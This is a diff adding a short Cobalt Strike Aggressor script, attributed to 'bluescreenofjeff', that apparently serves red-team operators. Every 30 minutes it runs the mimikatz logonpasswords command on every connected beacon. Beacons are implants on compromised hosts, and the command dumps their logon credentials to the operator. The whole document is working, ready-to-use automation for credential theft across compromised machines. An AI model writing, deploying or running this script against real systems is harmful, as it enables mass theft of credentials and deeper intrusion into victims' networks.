@@ -1,0 +1,10 @@
+# author: bluescreenofjeff
+#runs the mimikatz logonpasswords alias on all beacons
+
+on heartbeat_30m {
+    foreach $beacon (beacons()) {
+        $id = $beacon['id'];
+ 		binput($id, "logonpasswords");
+		blogonpasswords($id);
+    }
+}
